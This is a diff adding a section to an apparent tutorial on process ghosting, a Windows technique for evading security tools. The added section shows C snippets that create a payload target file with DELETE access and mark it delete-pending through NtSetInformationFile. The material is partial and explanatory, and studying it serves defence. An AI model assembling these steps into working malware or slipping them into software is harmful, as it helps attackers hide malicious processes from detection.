@@ -157,9 +157,46 @@ The program also makes sure that:
 
 If the checks pass, the program proceeds to call the `spawn_process()` function with the necessary parameters.
 
+### Prepare Target
+
+Next up, the we need to create the target fake file where the payload would be written with `DELETE` permission.
+
+```c
+h_tfile = CreateFileA(
+	target_exe,
+	DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE ,
+	FILE_SHARE_READ | FILE_SHARE_WRITE,
+	NULL,
+	OPEN_ALWAYS,
+	FILE_ATTRIBUTE_NORMAL,
+	NULL
+);
+```
+
+Next up, we need to put the file in `DELETE-PENDING` state. We do this via the `NtSetInformationFile()` function:
+
+```c
+IO_STATUS_BLOCK io_status;
+RtlZeroMemory(&io_status, sizeof(io_status));
+
+FILE_DISPOSITION_INFORMATION f_fileinfo;
+f_fileinfo.DeleteFile = TRUE;
+
+FILE_INFORMATION_CLASS f_info = FileDispositionInformation;
+
+_status = NtSetInformationFile(
+	h_tfile,
+	&io_status,
+	&f_fileinfo,
+	sizeof(f_fileinfo),
+	f_info);
+```
+
+If the function is successful, the handle to the open file iis returned.
+
 ### Reading Bytes
 
-### yhuj
+### Fetch Sections
 
 ## References
 - https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack
